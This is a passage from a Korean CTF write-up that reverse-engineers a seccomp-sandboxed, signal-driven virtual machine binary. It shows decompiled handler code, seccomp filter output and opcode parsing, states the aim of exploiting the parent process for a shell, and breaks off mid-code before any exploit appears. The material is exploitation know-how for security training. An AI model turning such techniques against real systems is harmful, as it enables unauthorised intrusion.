ì§„ì…í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">set_signal_handlers</span><span class="params">(<span class="keyword">struct</span> context *context)</span> <span class="comment">// 0x1766</span></span><br><span class="line">&#123;</span><br><span class="line">  g_context = context;</span><br><span class="line">  signal(<span class="number">1</span>, (<span class="type">__sighandler_t</span>)push_handler);</span><br><span class="line">  signal(<span class="number">2</span>, (<span class="type">__sighandler_t</span>)pop_handler);</span><br><span class="line">  signal(<span class="number">3</span>, (<span class="type">__sighandler_t</span>)clean_handler);</span><br><span class="line">  signal(<span class="number">4</span>, (<span class="type">__sighandler_t</span>)log_handler);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ìì‹ í”„ë¡œì„¸ìŠ¤ì—ì„œ í˜¸ì¶œí•˜ëŠ” <code>run</code> í•¨ìˆ˜ëŠ” <code>setup_seccomp</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê³  <code>send_locked</code> í•¨ìˆ˜ë¥¼ í†µí•´ <code>CLEAN</code> ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•œ í›„, ì…ë ¥ë°›ì€ opcodeë¥¼ íŒŒì‹±í•˜ì—¬ ê°ê°ì˜ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤. íŒŒì‹±í•œ opcodeì— í•´ë‹¹í•˜ëŠ” ëª…ë ¹ì–´ê°€ ì—†ìœ¼ë©´ <code>send</code> í•¨ìˆ˜ë¥¼ í†µí•´ ë¶€ëª¨ í”„ë¡œì„¸ìŠ¤ì— <code>SIGKILL</code> ì‹œê·¸ë„ì„ ì „ì†¡í•˜ì—¬ ì¢…ë£Œí•©ë‹ˆë‹¤. ì£¼ì„ ì²˜ë¦¬í•˜ì—¬ ìƒëµí•œ â€œopcode handlersâ€ ë¶€ë¶„ì´ ê°€ìƒë¨¸ì‹ ì´ ëª…ë ¹ì–´ë¥¼ ì²˜ë¦¬í•˜ëŠ” ë¶€ë¶„ìœ¼ë¡œ, ì´ ë¶€ë¶„ì€ ê°€ìƒë¨¸ì‹ ì˜ ì „ì²´ êµ¬ì¡°ë¥¼ ë¨¼ì € ì‚´í´ë³¸ í›„ ë¶„ì„í•˜ê² ìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">run</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> ppid, <span class="type">char</span> *code, <span class="type">unsigned</span> <span class="type">int</span> len, <span class="keyword">struct</span> context *context)</span>  <span class="comment">// 0xe2d</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  setup_seccomp(<span class="number">62</span>, <span class="number">0xC000003E</span>, <span class="number">1u</span>);</span><br><span class="line">  send_locked(ppid, context, CLEAN, <span class="number">0</span>);</span><br><span class="line">  pc = <span class="number">0</span>;</span><br><span class="line">  eflags = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( pc &lt; len )</span><br><span class="line">  &#123;</span><br><span class="line">    op = pc++;</span><br><span class="line">    <span class="keyword">switch</span> ( code[op] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* ... opcode handlers ... */</span></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        send(ppid, context, (<span class="keyword">enum</span> signal)<span class="number">9u</span>, <span class="number">0</span>);<span class="comment">// SIGKILL</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  send(ppid, context, (<span class="keyword">enum</span> signal)<span class="number">9u</span>, <span class="number">0</span>);      <span class="comment">// SIGKILL</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>setup_seccomp</code> í•¨ìˆ˜ëŠ” <code>prctl</code> ì‹œìŠ¤í…œ ì½œì„ í˜¸ì¶œí•˜ì—¬ ë‹¤ë¥¸ ì‹œìŠ¤í…œ ì½œì„ í•„í„°ë§í•˜ë„ë¡ í•˜ëŠ”ë°, seccomp-tools ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ë©´ ë°”ì´ë„ˆë¦¬ì— ì„¤ì •ëœ í•„í„°ë§ ì •ì±…ì„ ì‰½ê²Œ ë¶„ì„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">setup_seccomp</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">unsigned</span> __int16 a3)</span>  <span class="comment">// 0xc70</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> ( prctl(<span class="number">38</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;prctl(NO_NEW_PRIVS)&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( prctl(<span class="number">22</span>, <span class="number">2LL</span>, &amp;v3) )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;prctl(PR_SET_SECCOMP)&quot;</span>);            <span class="comment">// prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER))</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><div class="link-preview-widget"><a href="https://github.com/david942j/seccomp-tools" rel="noopener" target="_blank"><div class="link-preview-widget-title">GitHub - david942j/seccomp-tools: Provide powerful tools for seccomp analysis</div><div class="link-preview-widget-description">Provide powerful tools for seccomp analysis. Contribute to david942j/seccomp-tools development by creating an account on GitHub.</div><div class="link-preview-widget-url">GitHub</div></a><a class="link-preview-widget-image" href="https://github.com/david942j/seccomp-tools" rel="noopener" style="background-image: url('https://opengraph.githubassets.com/01f4fb80f4123abae512a76a497c1672d2eced2bd09dda197b3079b5e157bc16/david942j/seccomp-tools');" target="_blank"></a></div></p><p>ë‹¤ìŒê³¼ ê°™ì´ seccomp-tools ë¥¼ ì‹¤í–‰í•œ ê²°ê³¼, <code>kill</code> ì‹œìŠ¤í…œ ì½œì´ ì•„ë‹ˆë©´ ëª¨ë‘ í•„í„°ë§í•¨ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ìì‹ í”„ë¡œì„¸ìŠ¤ë¥¼ <code>execve</code> ë“±ì˜ ì‹œìŠ¤í…œ ì½œì„ ì‚¬ìš©í•˜ì—¬ ìµìŠ¤í”Œë¡œì‡í•˜ëŠ” ê²ƒì€ ë¶ˆê°€ëŠ¥í•˜ë©°, ë¶€ëª¨ í”„ë¡œì„¸ìŠ¤ë¥¼ ìµìŠ¤í”Œë¡œì‡í•˜ì—¬ ì…¸ì„ íšë“í•´ì•¼ í•¨ì„ ì¶”ì¸¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ seccomp-tools dump ./isolated</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x03 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0005</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x00 0x01 0x0000003e  <span class="keyword">if</span> (A != <span class="built_in">kill</span>) goto 0005</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x00000001  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure><p><code>run</code> í•¨ìˆ˜ëŠ” ëª…ë ¹ì–´ ì‹¤í–‰ ë° <code>SIGKILL</code> ì‹œê·¸ë„ ì „ì†¡ ë“±ì— <code>send_locked</code> ì™€ <code>send</code> ë‘ ê°€ì§€ í•¨ìˆ˜ë¥¼ ë™ì‹œì— ì‚¬ìš©í•˜ê³  ìˆìŠµë‹ˆë‹¤. ë¨¼ì € <code>send</code> í•¨ìˆ˜ë¥¼ ì‚´í´ë³´ë©´ <code>context-&gt;state</code> ë¥¼ <code>LOCKED</code> ë¡œ ì„¤ì •í•˜ê³ , ì¸ì <code>arg</code> ë¥¼ <code>context-&gt;reg</code> ì— ëŒ€ì…í•œ í›„ <code>kill</code> ì‹œìŠ¤í…œ ì½œì„ í˜¸ì¶œí•˜ì—¬ ë¶€ëª¨ í”„ë¡œì„¸ìŠ¤ì— ì‹œê·¸ë„ì„ ì „ì†¡í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">send</span><span class="params">(<span class="type">__pid_t</span> ppid, <span class="keyword">struct</span> context *context, <span class="keyword">enum</span> signal signum, <span class="type">int</span> arg)</span>  <span class="comment">// 0xda4</span></span><br><span class="line">&#123;</span><br><span class="line">  context-&gt;state = LOCKED;</span><br><span class="line">  context-&gt;reg = arg;</span><br><span class="line">  kill(ppid, signum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì´ ë•Œ <code>signum</code> ì— í•´ë‹¹í•˜ëŠ” ì‹œê·¸ë„ ë²ˆí˜¸ëŠ” ë‹¤ìŒê³¼ ê°™ì´ <code>signal</code> ì—´ê±°í˜• ì¤‘ í•˜ë‚˜ ë˜ëŠ” 9 (<code>SIGKILL</code>)ë¡œ, <code>PUSH</code> , <code>POP</code> , <code>CLEAN</code> , <code>LOG</code> ê°€ ê°ê°ì˜ ëª…ë ¹ì–´ì— í•´ë‹¹í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ë°”ì´ë„ˆë¦¬ê°€ ë¬˜ì‚¬í•˜ëŠ” ê°€ìƒë¨¸ì‹ ì€ ìì‹ í”„ë¡œì„¸ìŠ¤ê°€ ëª…ë ¹ì–´ì™€ ì¸ìë¥¼ ì‹œê·¸ë„ë¡œ ì „ì†¡í•˜ë©´, ë¶€ëª¨ í”„ë¡œì„¸ìŠ¤ì—ì„œ í•´ë‹¹í•˜ëŠ” í•¸ë“¤ëŸ¬ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ ì²˜ë¦¬í•˜ëŠ” êµ¬ì¡°ì„ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">signal</span> :</span> <span class="type">unsigned</span> __int32</span><br><span class="line">&#123;</span><br><span class="line">  PUSH = <span class="number">0x1</span>,</span><br><span class="line">  POP = <span class="number">0x2</span>,</span><br><span class="line">  CLEAN = <span class="number">0x3</span>,</span><br><span class="line">  LOG = <span class="number">0x4</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ë‹¤ìŒìœ¼ë¡œ <code>send_blocked</code> í•¨ìˆ˜ëŠ” ë™ì¼í•˜ê²Œ <code>send</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ ì‹œê·¸ë„ì„ ì „ì†¡í•œ ì´í›„, <code>context-&gt;state</code> ê°€ <code>LOCKED</code> ì¸ ë™ì•ˆ ë£¨í”„ì— ì§„ì…í•˜ëŠ” busy waitingì„ ìˆ˜í–‰í•©ë‹ˆë‹¤. ì´í›„ ë¶„ì„í•  ë¶€ëª¨ í”„ë¡œì„¸ìŠ¤ì˜ í•¸ë“¤ëŸ¬ í•¨ìˆ˜ë“¤ì€ ëª¨ë‘ ëª…ë ¹ì–´ ì‹¤í–‰ ë£¨í‹´ ì´í›„ <code>context-&gt;state</code> ë¥¼ <code>SUCCESS</code> ë˜ëŠ” <code>ERROR</code> ë¡œ ì„¤ì •í•©ë‹ˆë‹¤. <code>send</code> í•¨ìˆ˜ê°€ <code>context-&gt;state</code> ë¥¼ <code>LOCKED</code> ë¡œ ì„¤ì •í•œ ì´ìƒ í•¸ë“¤ëŸ¬ í•¨ìˆ˜ê°€ ë£¨í‹´ì„ ì¢…ë£Œí•  ë•Œê¹Œì§€ <code>send_blocked</code> í•¨ìˆ˜ëŠ” ë¬´í•œ ëŒ€ê¸°í•˜ë¯€ë¡œ, ì´ í•¨ìˆ˜ëŠ” ëª…ë ¹ì–´ë¥¼ ì¼ì¢…ì˜ ë¸”ë¡œí‚¹(blocking) ë°©ì‹ìœ¼ë¡œ ì‹¤í–‰í•˜ë„ë¡ í•œë‹¤ê³  ìƒê°í•  ìˆ˜ ìˆê² ìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">send_locked</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> ppid, <span class="keyword">struct</span> context *context, <span class="keyword">enum</span> signal signum, <span class="type">unsigned</span> <span class="type">int</span> arg)</span>   <span class="comment">// 0xddf</span></span><br><span class="line">&#123;</span><br><span class="line">  send(ppid, context, signum, arg);</span><br><span class="line">  <span class="keyword">while</span> ( context-&gt;state == LOCKED )            <span class="comment">// busy waiting while being processed</span></span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( context-&gt;state == ERROR )</span><br><span class="line">    context-&gt;reg = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì´ë²ˆì—ëŠ” ë¶€ëª¨ í”„ë¡œì„¸ìŠ¤ì—ì„œ ê°ê°ì˜ ëª…ë ¹ì–´ë¥¼ ì²˜ë¦¬í•˜ëŠ” í•¸ë“¤ëŸ¬ í•¨ìˆ˜ë¥¼ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤. ëª¨ë“  í•¸ë“¤ëŸ¬ í•¨ìˆ˜ì—ì„œ ê³µí†µì ìœ¼ë¡œ ì‚¬ìš©í•˜ëŠ” ì „ì—­ ë³€ìˆ˜ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li><code>stack</code> - ì •ìˆ˜í˜• ì „ì—­ ë°°ì—´ë¡œ, ì›ì†Œ 1543ê°œ í¬ê¸°ì…ë‹ˆë‹¤.</li><li><code>g_stack_idx</code> - ìŠ¤íƒ í¬ì¸í„°ì˜ ì—­í• ì„ í•˜ëŠ” ì •ìˆ˜í˜• ì „ì—­ ë³€ìˆ˜ë¡œ, ì´ ë³€ìˆ˜ì˜ ê°’ì„ ì¸ë±ìŠ¤ë¡œ <code>stack</code> ì— ì ‘ê·¼í•©ë‹ˆë‹¤.</li><li><code>log_enabled</code> - ì „ì—­ ë³€ìˆ˜ë¡œ, ê°’ì´ 0ì´ ì•„ë‹Œ ê²½ìš° í•¸ë“¤ëŸ¬ í•¨ìˆ˜ê°€ ë¡œê·¸ë¥¼ ì¶œë ¥í•©ë‹ˆë‹¤.</li></ol><p><code>push_handler</code> í•¨ìˆ˜ëŠ” <code>g_stack_idx</code> ê°€ 767ë³´ë‹¤ ì‘ê±°ë‚˜ ê°™ì€ ê²½ìš° 1ì„ ì¦ê°€ì‹œí‚¤ê³ , <code>stack[g_stack_idx]</code> ì— ì¸ìë¡œ ì „ë‹¬ëœ <code>g_context-&gt;reg</code> ë¥¼ ëŒ€ì…í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">push_handler</span><span class="params">()</span> <span class="comment">// 0x15c2</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> stack_idx; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( g_stack_idx &gt; <span class="number">767</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    g_context-&gt;state = ERROR;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( log_enabled )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[*] PUSH stack[0x%x] = 0x%x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)g_stack_idx, g_context-&gt;reg);</span><br><span class="line">    stack_idx = g_stack_idx++;</span><br><span class="line">    <span class="built_in">stack</span>[stack_idx] = g_context-&gt;reg;</span><br><span class="line">    g_context-&gt;state = SUCCESS;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>pop_handler</code> í•¨ìˆ˜ëŠ” <code>g_stack_idx</code> ê°€ 0ì´ ì•„ë‹Œ ê²½ìš° 1ì„ ê°ì†Œì‹œí‚¤ê³ , <code>stack[g_stack_idx]</code> ë¥¼ <code>g_context-&gt;reg</code> ì— ëŒ€ì…í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">pop_handler</span><span class="params">()</span>  <span class="comment">// 0x164d</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( g_stack_idx )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( log_enabled )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[*] POP stack[0x%x] == 0x%x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(g_stack_idx - <span class="number">1</span>), <span class="built_in">stack</span>[g_stack_idx - <span class="number">1</span>]);</span><br><span class="line">    g_context-&gt;reg = <span class="built_in">stack</span>[--g_stack_idx];</span><br><span class="line">    g_context-&gt;state = SUCCESS;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    g_context-&gt;state = ERROR;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>clean_handler</code> í•¨ìˆ˜ëŠ” <code>g_stack_idx</code> ë¥¼ 0ìœ¼ë¡œ ì´ˆê¸°í™”ì‹œí‚µë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">clean_handler</span><span class="params">()</span>  <span class="comment">// 0x16f7</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( log_enabled )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] CLEAN STACK&quot;</span>);</span><br><span class="line">  <span class="built_in">stack</span>[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  g_stack_idx = <span class="number">0</span>;</span><br><span class="line">  g_context-&gt;state = SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>log_handler</code> í•¨ìˆ˜ëŠ” <code>log_enabled</code> ì— <code>g_context-&gt;reg</code> ë¥¼ ëŒ€ì…í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">log_handler</span><span class="params">()</span>  <span class="comment">// 0x1736</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[!] I prepared log feature for you :)&quot;</span>);</span><br><span class="line">  log_enabled = g_context-&gt;reg;</span><br><span class="line">  g_context-&gt;state = SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ê°€ìƒë¨¸ì‹ ì˜ ì „ì²´ êµ¬ì¡°ë¥¼ í›‘ì–´ë³´ì•˜ìŠµë‹ˆë‹¤. ì´ì œ ë‹¤ì‹œ ìì‹ í”„ë¡œì„¸ìŠ¤ë¡œ ëŒì•„ê°€ <code>run</code> í•¨ìˆ˜ì—ì„œ opcodeë¥¼ íŒŒì‹±í•˜ëŠ” ì½”ë“œë¥¼ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤. <code>run</code> í•¨ìˆ˜ëŠ” switch êµ¬ë¬¸ì„ ë°˜ë³µí•˜ë©´ì„œ íŒŒì‹±ì„ ìˆ˜í–‰í•˜ëŠ”ë°, ê°ê°ì˜ case ë¸”ë¡ì—ì„œ ê³µí†µì ì¸ ë¶€ë¶„ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li><code>PUSH</code> ë¥¼ ì œì™¸í•œ ì¸ìê°€ ìˆëŠ” opcodeëŠ” ì¸ìë¥¼ opcodeì— í¬í•¨í•˜ì—¬ ì „ë‹¬í• ì§€, <code> stack</code> ì—ì„œ <code>POP</code> í•˜ì—¬ ì „ë‹¬í• ì§€ í”Œë˜ê·¸ ê°’ì„ í†µí•´ ì„ íƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.<ul><li>í”Œë˜ê·¸ ê°’ì´ <code>\x66</code> ì´ë©´ opcodeê°€ ì¸ìë¥¼ í¬í•¨í•˜ê³  ìˆê³ , <code>\x55</code> ë©´ <code>send_locked</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ <code>POP</code> ëª…ë ¹ì„ ìˆ˜í–‰í•œ í›„ ê²°ê³¼ë¥¼ ì¸ìë¡œ ì „ë‹¬í•©ë‹ˆë‹¤.</li></ul></li><li><code>ADD</code> , <code>SUB</code> , <code>MUL</code> , <code>DIV</code> , <code>CMP</code> ëŠ” opcodeì˜ êµ¬ì¡°ê°€ ì™„ì „íˆ ë™ì¼í•˜ë©°, ì´ ì¤‘ <code>CMP</code> ë¥¼ ì œì™¸í•œ ë‚˜ë¨¸ì§€ëŠ” <code>send_locked</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ ê²°ê³¼ë¥¼ <code>stack</code> ì— <code>PUSH</code> í•©ë‹ˆë‹¤.</li></ol><p>ë‹¤ìŒì€ opcodeë¥¼ íŒŒì‹±í•˜ëŠ” switch êµ¬ë¬¸ì…ë‹ˆë‹¤. ê°ê°ì˜ opcodeëŠ” ì²« ë°”ì´íŠ¸ê°€ ì¢…ë¥˜ë¥¼ ë‚˜íƒ€ë‚´ë©° caseì— í•´ë‹¹í•©ë‹ˆë‹¤. ë‚˜ë¨¸ì§€ ë°”ì´íŠ¸ë“¤ì€ ì£¼ì„ì— ë‚˜íƒ€ë‚¸ ë°”ì™€ ê°™ì´ í”Œë˜ê·¸ ê°’ê³¼ ê²½ìš°ì— ë”°ë¼ ì¸ìë“¤ë¡œ êµ¬ì„±ë˜ì–´ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( code[op] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0</span>:                                   <span class="comment">// PUSH [u32 arg1]</span></span><br><span class="line">    push_arg1 = *(_DWORD *)&amp;code[pc];</span><br><span class="line">    pc += <span class="number">4</span>;</span><br><span class="line">    send(ppid, context, PUSH, push_arg1);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:                                   <span class="comment">// POP</span></span><br><span class="line">    send(ppid, context, POP, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:                                   <span class="comment">// ADD [u8 flag1] [optional u32 arg1] [u8 flag2] [optional u32 arg2]</span></span><br><span class="line">                                            <span class="comment">// add two arguments and push</span></span><br><span class="line">    _pc = pc;</span><br><span class="line">    v21 = pc + <span class="number">1</span>;</span><br><span class="line">    add_flag1 = code[_pc];</span><br><span class="line">    <span class="keyword">if</span> ( add_flag1 == <span class="number">0x66</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      add_arg1 = *(_DWORD *)&amp;code[v21];</span><br><span class="line">      v21 += <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( add_flag1 != <span class="number">0x55</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      send_locked(ppid, context, POP, <span class="number">0</span>);</span><br><span class="line">      add_arg1 = context-&gt;reg;</span><br><span class="line">    &#125;</span><br><span class="line">    v6 = v21;</span><br><span class="line">    pc = v21 + <span class="number">1</span>;</span><br><span class="line">    add_flag2 = code[v6];</span><br><span class="line">    <span class="keyword">if</span> ( add_flag2 == <span class="number">0x66</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      add_arg2 = *(_DWORD *)&amp;code[pc];</span><br><span class="line">      pc += <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( add_flag2 != <span class="number">0x55</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      send_locked(ppid, context, POP, <span 